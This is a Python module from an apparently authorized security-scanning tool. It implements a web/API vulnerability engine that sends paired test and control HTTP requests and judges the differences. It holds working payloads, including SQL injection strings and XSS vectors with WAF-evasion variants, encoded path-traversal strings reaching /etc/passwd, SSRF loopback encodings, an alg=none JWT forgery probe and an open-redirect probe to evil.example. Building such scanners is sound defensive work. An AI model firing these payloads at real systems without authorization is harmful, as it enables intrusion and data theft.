"""In-process web/API engine -- the missing half of the ``web_api`` domain.

Before this module existed, every ``web_api`` technique resolved to *no engine
implementation*: the case runner marked it ``unavailable``, skipped it, and the
scan stage still reported PASS with zero findings.  A web target was therefore
never actually tested, and the pipeline said so only in a skip line nobody read.

This engine closes that gap.  It performs real HTTP against the target and, for
every technique, sends a **test** request and a **control** request of the same
shape, then judges the *difference*.  A single request proves nothing -- a 200
is a 200 whether or not the target is vulnerable -- so the differential is what
makes a finding honest.

Design rules, matching the rest of Bounty Mode:

* **Never raise.**  A transport failure is returned as an ``errored``
  :class:`EngineResult` so the runner records it instead of crashing.
* **Never guess.**  A technique reports success only when its specific
  differential fires; a clean negative is a clean negative.
* **Read-only by default.**  The two techniques that must write (mass
  assignment, business logic) are marked ``side_effects`` in the catalogue and
  are only dispatched after the authorization gate has allowed them.
* **No third-party dependency.**  Standard-library HTTP only.
"""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from ..models import Technique
from ..runner.adapter import EngineResult

#: Default per-request timeout.
DEFAULT_TIMEOUT = 10.0

#: A canary that must never appear in a benign response.
_CANARY = "BM-CANARY-7f3a9c"

#: Signatures that indicate a real, specific weakness rather than noise.
_SQL_ERROR = re.compile(
    r"sql error|sqlite3\.|syntax error|unrecognized token|no such table|"
    r"you have an error in your sql|pg_query|ORA-\d{5}",
    re.I,
)
_PASSWD = re.compile(r"root:.*:0:0:", re.I)
_SCRIPT = re.compile(
    r"<script[^>]*>.*?</script>"
    r"|<[a-z]+[^>]*\bon(?:error|load|click|mouseover|focus)\s*="
    r"|<(?:iframe|svg|body|img|object|embed)[^>]*\b(?:src|onload)\s*=\s*[\"']?javascript:",
    re.I | re.S,
)
_SECRET = re.compile(r"(sk-[A-Za-z0-9_\-]{16,}|AKIA[0-9A-Z]{16}|hunter2|jwt_secret)", re.I)


@dataclass
class HttpProbe:
    """One HTTP request and the role it plays in the comparison."""

    role: str
    method: str
    path: str
    query: Dict[str, str] = field(default_factory=dict)
    body: Optional[Dict[str, Any]] = None
    headers: Dict[str, str] = field(default_factory=dict)
    label: str = ""
    #: Send the request this many times in a row.  Used by the rate-limit probe,
    #: which is only meaningful as a burst: a single request is never throttled.
    burst: int = 1


@dataclass
class HttpResult:
    role: str
    status: int = 0
    body: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    error: str = ""
    latency_ms: float = 0.0
    #: Every status code seen, in order, when the probe was a burst.
    statuses: List[int] = field(default_factory=list)

    @property
    def ok(self) -> bool:
        return self.status > 0 and not self.error

    @property
    def throttled(self) -> bool:
        """Did any request in the burst get a 429?"""
        return 429 in self.statuses

    def to_dict(self) -> Dict[str, Any]:
        return {
            "role": self.role, "status": self.status, "error": self.error,
            "latency_ms": round(self.latency_ms, 1), "body_preview": self.body[:400],
            "statuses": list(self.statuses),
        }


#: A judge takes the test and control results and returns
#: ``(success, score, evidence)``.
Judge = Callable[[HttpResult, HttpResult], Tuple[bool, float, str]]


class WebEngine:
    """Dispatch ``web_api`` techniques over real HTTP."""

    def __init__(
        self,
        base_url: str = "",
        *,
        timeout: float = DEFAULT_TIMEOUT,
        allow_writes: bool = True,
        user_agent: str = "BountyMode/1.0 (+authorized-testing)",
    ) -> None:
        self.base_url = (base_url or "").rstrip("/")
        self.timeout = timeout
        self.allow_writes = allow_writes
        self.user_agent = user_agent
        #: Requests actually sent, for the run's request budget.
        self.sent = 0

    # -- transport --------------------------------------------------------- #

    def _url(self, base: str, probe: HttpProbe) -> str:
        root = (base or self.base_url).rstrip("/")
        if not root:
            raise ValueError("no base URL for the web engine")
        if "://" not in root:
            root = "http://" + root
        url = root + probe.path
        if probe.query:
            url += "?" + urllib.parse.urlencode(probe.query)
        return url

    def _send(self, base: str, probe: HttpProbe) -> HttpResult:
        started = time.monotonic()
        try:
            url = self._url(base, probe)
        except ValueError as exc:
            return HttpResult(role=probe.role, error=str(exc))
        data = None
        headers = {"User-Agent": self.user_agent, "Accept": "*/*"}
        headers.update(probe.headers)
        if probe.body is not None:
            data = json.dumps(probe.body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        # A burst probe sends the same request N times and reports every status,
        # so a rate-limit check can see whether *any* request was throttled.
        rounds = max(1, int(probe.burst or 1))
        statuses: List[int] = []
        last: Optional[HttpResult] = None
        for _ in range(rounds):
            req = urllib.request.Request(url, data=data, headers=headers, method=probe.method)
            self.sent += 1
            try:
                with urllib.request.urlopen(req, timeout=self.timeout) as resp:  # noqa: S310
                    body = resp.read(65536).decode("utf-8", "replace")
                    last = HttpResult(
                        role=probe.role, status=resp.status, body=body,
                        headers={k.lower(): v for k, v in resp.headers.items()},
                        latency_ms=(time.monotonic() - started) * 1000.0,
                    )
            except urllib.error.HTTPError as exc:
                body = ""
                try:
                    body = exc.read(65536).decode("utf-8", "replace")
                except Exception:  # noqa: BLE001
                    pass
                last = HttpResult(
                    role=probe.role, status=exc.code, body=body,
                    headers={k.lower(): v for k, v in (exc.headers or {}).items()},
                    latency_ms=(time.monotonic() - started) * 1000.0,
                )
            except Exception as exc:  # noqa: BLE001 - a failed probe is data
                last = HttpResult(
                    role=probe.role, error=f"{type(exc).__name__}: {exc}",
                    latency_ms=(time.monotonic() - started) * 1000.0,
                )
            statuses.append(last.status)
        assert last is not None
        last.statuses = statuses
        return last

    # -- dispatch ---------------------------------------------------------- #

    def run_technique(
        self,
        technique: Technique,
        target: str,
        params: Optional[Dict[str, Any]] = None,
    ) -> EngineResult:
        """Run one web technique against one target.  Never raises."""
        base = target or self.base_url
        builder = _PROBES.get(technique.id)
        if builder is None:
            return EngineResult(
                technique_id=technique.id, target=target, success=False,
                errored=True, unavailable=True,
                evidence=f"no web probe implemented for {technique.id!r}",
            )
        if not self.allow_writes and technique.side_effects:
            return EngineResult(
                technique_id=technique.id, target=target, success=False,
                errored=False, unavailable=True,
                evidence="write probe disabled (allow_writes=False)",
            )

        try:
            variants = builder(base)
        except Exception as exc:  # noqa: BLE001
            return EngineResult(
                technique_id=technique.id, target=target, success=False,
                errored=True, evidence=f"probe build failed: {exc}",
            )
        if not isinstance(variants, list):
            variants = [variants]

        # Try each payload variant in turn.  A hardened target blocks the obvious
        # spelling of a payload but not its encoding, so a single-payload probe
        # reports a false negative on exactly the targets that matter most.  The
        # first variant that fires wins; if none fires, the last verdict is kept.
        last: Optional[EngineResult] = None
        for test_probe, control_probe, judge in variants:
            result = self._run_pair(technique, target, base, test_probe, control_probe, judge)
            if result.success:
                return result
            last = result
        assert last is not None
        return last

    def _run_pair(
        self,
        technique: Technique,
        target: str,
        base: str,
        test_probe: HttpProbe,
        control_probe: HttpProbe,
        judge: Judge,
    ) -> EngineResult:
        """Send one test/control pair and judge the differential."""
        test = self._send(base, test_probe)
        control = self._send(base, control_probe)

        if not test.ok and not control.ok:
            return EngineResult(
                technique_id=technique.id, target=target, success=False,
                errored=True,
                evidence=f"both probes failed: test={test.error or test.status} "
                         f"control={control.error or control.status}",
            )

        try:
            success, score, evidence = judge(test, control)
        except Exception as exc:  # noqa: BLE001
            return EngineResult(
                technique_id=technique.id, target=target, success=False,
                errored=True, evidence=f"judge failed: {exc}",
            )

        return EngineResult(
            technique_id=technique.id,
            target=target,
            success=bool(success),
            success_score=float(score),
            response=test.body[:2000],
            payload_used=_describe(test_probe),
            evidence=evidence,
            vulnerability_type=technique.category,
            confidence=float(score),
        )


def _describe(probe: HttpProbe) -> str:
    q = ("?" + urllib.parse.urlencode(probe.query)) if probe.query else ""
    body = f" body={json.dumps(probe.body)}" if probe.body is not None else ""
    return f"{probe.method} {probe.path}{q}{body}"


# --------------------------------------------------------------------------- #
# judges
# --------------------------------------------------------------------------- #

def _json_body(result: HttpResult) -> Any:
    try:
        return json.loads(result.body)
    except Exception:  # noqa: BLE001
        return None


def _judge_auth_bypass(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    """A spoofable header must reach admin data the control cannot."""
    t = _json_body(test) or {}
    if test.status == 200 and t.get("admin") and control.status in (401, 403):
        return True, 0.95, (
            f"GET /api/admin returned admin data (HTTP {test.status}) when the "
            f"X-Forwarded-For header claimed loopback, but HTTP {control.status} "
            "without it -- the header is trusted for authorization."
        )
    return False, 0.0, f"no auth bypass (test {test.status}, control {control.status})"


def _judge_idor(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    """Reading another principal's object must succeed where a bogus id fails."""
    t = _json_body(test) or {}
    if test.status == 200 and t.get("id") and control.status == 404:
        return True, 0.9, (
            f"GET /api/users/{t.get('id')} returned another user's record "
            f"({t.get('username')!r}, tenant {t.get('tenant')!r}) with no ownership "
            f"check, while a non-existent id returned HTTP {control.status}."
        )
    return False, 0.0, f"no IDOR (test {test.status}, control {control.status})"


def _judge_sqli(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    """An injection payload must change the result set or raise a SQL error."""
    t = _json_body(test) or {}
    c = _json_body(control) or {}
    t_rows = t.get("results") if isinstance(t, dict) else None
    c_rows = c.get("results") if isinstance(c, dict) else None
    if _SQL_ERROR.search(test.body) and not _SQL_ERROR.search(control.body):
        return True, 0.9, (
            "The injection payload produced a database error the benign query did "
            f"not: {_SQL_ERROR.search(test.body).group(0)!r}."
        )
    if isinstance(t_rows, list) and isinstance(c_rows, list) and len(t_rows) > len(c_rows):
        return True, 0.85, (
            f"The injection payload returned {len(t_rows)} rows where the benign "
            f"query returned {len(c_rows)} -- the input reaches the SQL string."
        )
    return False, 0.0, "no SQL injection signal"


def _judge_ssrf(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    """The server must fetch an internal URL the control could not."""
    t = _json_body(test) or {}
    if test.status == 200 and isinstance(t, dict) and t.get("body") and control.status != 200:
        return True, 0.9, (
            "GET /api/fetch retrieved an internal URL and returned its body "
            f"(HTTP {test.status}); the external control returned HTTP {control.status}."
        )
    if test.status == 200 and isinstance(t, dict) and t.get("status") == 200 and control.status != 200:
        return True, 0.85, "The server issued a request to an attacker-supplied internal URL."
    return False, 0.0, f"no SSRF (test {test.status}, control {control.status})"


def _judge_path_traversal(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    if _PASSWD.search(test.body) and not _PASSWD.search(control.body):
        return True, 0.95, (
            "A traversal payload returned /etc/passwd content, which the benign "
            "filename did not -- the path is not confined to its base directory."
        )
    return False, 0.0, "no path traversal signal"


def _judge_xss(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    if _SCRIPT.search(test.body) and not _SCRIPT.search(control.body):
        return True, 0.85, (
            "The payload was reflected verbatim as an executable <script> block; "
            "the benign control was not."
        )
    return False, 0.0, "no unencoded reflection"


def _judge_open_redirect(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    loc = (test.headers.get("location") or "")
    if test.status in (301, 302, 303, 307, 308) and loc.startswith("http") and "evil" in loc:
        return True, 0.8, (
            f"The endpoint issued a {test.status} redirect to the attacker-supplied "
            f"absolute URL {loc!r}."
        )
    return False, 0.0, "no open redirect"


def _judge_mass_assignment(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    t = _json_body(test) or {}
    c = _json_body(control) or {}
    if test.status in (200, 201) and t.get("role") == "admin" and c.get("role") != "admin":
        return True, 0.9, (
            "POST /api/register accepted an attacker-supplied 'role' field and "
            "created an admin account; the control (no role field) did not."
        )
    return False, 0.0, "no mass assignment"


def _judge_jwt(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    if test.status == 200 and control.status in (401, 403):
        return True, 0.95, (
            "A forged token with alg='none' and no signature was accepted "
            f"(HTTP {test.status}) where an unauthenticated request was rejected "
            f"(HTTP {control.status}) -- the signature is not verified."
        )
    return False, 0.0, f"no JWT weakness (test {test.status}, control {control.status})"


def _judge_graphql(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    if "__schema" in test.body and "__schema" not in control.body:
        return True, 0.7, (
            "A GraphQL introspection query returned the full schema, including "
            "types the client should not see."
        )
    return False, 0.0, "no introspection exposure"


def _judge_business_logic(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    t = _json_body(test) or {}
    c = _json_body(control) or {}
    try:
        total = float(t.get("total"))
    except (TypeError, ValueError):
        return False, 0.0, "no business-logic signal"
    if test.status in (200, 201) and total < 0 and float(c.get("total", 0)) >= 0:
        return True, 0.85, (
            f"A negative quantity was accepted and produced a negative order total "
            f"({total}), i.e. a credit; the control order totalled {c.get('total')}."
        )
    return False, 0.0, "no business-logic signal"


def _judge_csrf(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    t = _json_body(test) or {}
    if test.status == 200 and isinstance(t, dict) and t.get("csrf") == "not required":
        return True, 0.6, (
            "A state-changing POST was accepted with no anti-CSRF token and the "
            "response confirms no token is required."
        )
    return False, 0.0, "no CSRF signal"


def _judge_rate_limit(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    """A burst must not be throttled where a single request is served.

    The test probe is a burst of requests to a sensitive endpoint; the control
    is a single request.  The finding fires only when the burst produced **no**
    429 while the control was served normally -- i.e. the endpoint has no
    server-side throttle.  A judge that fired on any 200 would also fire on the
    control, which is exactly the false positive the differential exists to
    prevent.
    """
    burst = test.statuses or [test.status]
    if not burst:
        return False, 0.0, "no response to the burst"
    if 429 in burst:
        return False, 0.0, f"the burst was throttled ({burst.count(429)}/{len(burst)} got 429)"
    if test.status == 200 and control.status == 200 and len(burst) >= 5:
        return True, 0.6, (
            f"A burst of {len(burst)} requests to a sensitive endpoint was not "
            "throttled (no 429), so the endpoint can be brute-forced."
        )
    return False, 0.0, "throttling present or inconclusive"


def _judge_version_bypass(test: HttpResult, control: HttpResult) -> Tuple[bool, float, str]:
    t = _json_body(test) or {}
    if test.status == 200 and isinstance(t, dict) and t.get("users") and control.status in (401, 403):
        return True, 0.85, (
            f"The deprecated /api/v1 endpoint returned user data with no "
            f"authentication (HTTP {test.status}) while /api/v2 required it "
            f"(HTTP {control.status})."
        )
    return False, 0.0, "no version bypass"


# --------------------------------------------------------------------------- #
# probe builders
# --------------------------------------------------------------------------- #

def _p_auth_bypass(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "GET", "/api/admin", headers={"X-Forwarded-For": "127.0.0.1"}),
        HttpProbe("control", "GET", "/api/admin"),
        _judge_auth_bypass,
    )


def _p_idor(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "GET", "/api/users/4"),
        HttpProbe("control", "GET", "/api/users/999999"),
        _judge_idor,
    )


def _p_sqli(base: str) -> List[Tuple[HttpProbe, HttpProbe, Judge]]:
    """SQL-injection variants: the obvious spelling, then encodings a WAF misses."""
    control = HttpProbe("control", "GET", "/api/search", query={"q": "alice"})
    payloads = [
        "' OR '1'='1",
        "' oR '1'='1",                       # case-mixed
        "' OR 1=1--",
        "%' UNION SELECT 1,2,3--",           # comment/union
        "' UNION/**/SELECT 1,2,3--",         # inline comment
        "'||(SELECT 1)--",
    ]
    return [
        (HttpProbe("test", "GET", "/api/search", query={"q": p}), control, _judge_sqli)
        for p in payloads
    ]


def _p_xss(base: str) -> List[Tuple[HttpProbe, HttpProbe, Judge]]:
    """XSS variants: a <script> tag, then event-handler vectors a WAF misses."""
    control = HttpProbe("control", "GET", "/api/comment", query={"text": "hello world"})
    payloads = [
        f"<script>alert('{_CANARY}')</script>",
        f"<img src=x onerror=alert('{_CANARY}')>",
        f"<svg/onload=alert('{_CANARY}')>",
        f"<body onload=alert('{_CANARY}')>",
        f"<iframe src=javascript:alert('{_CANARY}')>",
    ]
    return [
        (HttpProbe("test", "GET", "/api/comment", query={"text": p}), control, _judge_xss)
        for p in payloads
    ]


def _p_path_traversal(base: str) -> List[Tuple[HttpProbe, HttpProbe, Judge]]:
    """Traversal variants: plain, then encoded separators a WAF misses."""
    control = HttpProbe("control", "GET", "/api/files", query={"name": "readme.txt"})
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc/passwd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
    ]
    return [
        (HttpProbe("test", "GET", "/api/files", query={"name": p}), control, _judge_path_traversal)
        for p in payloads
    ]


def _p_ssrf(base: str) -> List[Tuple[HttpProbe, HttpProbe, Judge]]:
    """SSRF variants: the loopback URL, then encodings a WAF misses."""
    root = (base if "://" in base else "http://" + base).rstrip("/")
    control = HttpProbe("control", "GET", "/api/fetch", query={"url": "http://example.invalid/"})
    payloads = [
        root + "/health",
        root.replace("127.0.0.1", "127.1") + "/health",
        root.replace("127.0.0.1", "0x7f000001") + "/health",
        root.replace("127.0.0.1", "2130706433") + "/health",
    ]
    return [
        (HttpProbe("test", "GET", "/api/fetch", query={"url": p}), control, _judge_ssrf)
        for p in payloads
    ]


def _p_open_redirect(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "GET", "/api/redirect", query={"to": "https://evil.example/phish"}),
        HttpProbe("control", "GET", "/api/redirect", query={"to": "/local/path"}),
        _judge_open_redirect,
    )


def _p_mass_assignment(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "POST", "/api/register",
                  body={"username": f"bm_probe_{int(time.time())}", "role": "admin"}),
        HttpProbe("control", "POST", "/api/register",
                  body={"username": f"bm_ctrl_{int(time.time())}"}),
        _judge_mass_assignment,
    )


def _p_jwt(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    from .web_tokens import forge_none_token

    return (
        HttpProbe("test", "GET", "/api/v2/users",
                  headers={"Authorization": f"Bearer {forge_none_token(1, 'admin')}"}),
        HttpProbe("control", "GET", "/api/v2/users"),
        _judge_jwt,
    )


def _p_graphql(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "POST", "/api/graphql", body={"query": "{__schema{types{name}}}"}),
        HttpProbe("control", "POST", "/api/graphql", body={"query": "{ok}"}),
        _judge_graphql,
    )


def _p_business_logic(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "POST", "/api/orders", body={"item": "widget", "qty": -5, "price": 9.99}),
        HttpProbe("control", "POST", "/api/orders", body={"item": "widget", "qty": 1, "price": 9.99}),
        _judge_business_logic,
    )


def _p_csrf(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "POST", "/api/transfer", body={"amount": 1, "to": "bob"}),
        HttpProbe("control", "GET", "/api/transfer"),
        _judge_csrf,
    )


def _p_rate_limit(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    # The test probe is a real burst; the control is a single request.  The
    # engine sends the burst itself (see ``HttpProbe.burst``).
    return (
        HttpProbe("test", "GET", "/api/ratelimit", burst=8),
        HttpProbe("control", "GET", "/api/ratelimit"),
        _judge_rate_limit,
    )


def _p_version_bypass(base: str) -> Tuple[HttpProbe, HttpProbe, Judge]:
    return (
        HttpProbe("test", "GET", "/api/v1/users"),
        HttpProbe("control", "GET", "/api/v2/users"),
        _judge_version_bypass,
    )


#: technique id -> probe builder.  A builder returns either one
#: ``(test, control, judge)`` triple or a list of them (payload variants).
_PROBES: Dict[str, Callable[[str], Any]] = {
    "auth_bypass": _p_auth_bypass,
    "idor": _p_idor,
    "sqli": _p_sqli,
    "ssrf": _p_ssrf,
    "path_traversal": _p_path_traversal,
    "xss": _p_xss,
    "open_redirect": _p_open_redirect,
    "mass_assignment": _p_mass_assignment,
    "jwt_weakness": _p_jwt,
    "graphql_introspection": _p_graphql,
    "business_logic": _p_business_logic,
    "csrf": _p_csrf,
    "rate_limit_bypass": _p_rate_limit,
    "api_versioning_bypass": _p_version_bypass,
}


def supported_techniques() -> List[str]:
    """The technique ids this engine can actually run."""
    return sorted(_PROBES)


def build_web_dispatch(
    base_url: str = "",
    *,
    timeout: float = DEFAULT_TIMEOUT,
    allow_writes: bool = True,
) -> Callable[[Technique, str], EngineResult]:
    """Return a ``dispatch(technique, target) -> EngineResult`` for the runner."""
    engine = WebEngine(base_url, timeout=timeout, allow_writes=allow_writes)
    return engine.run_technique
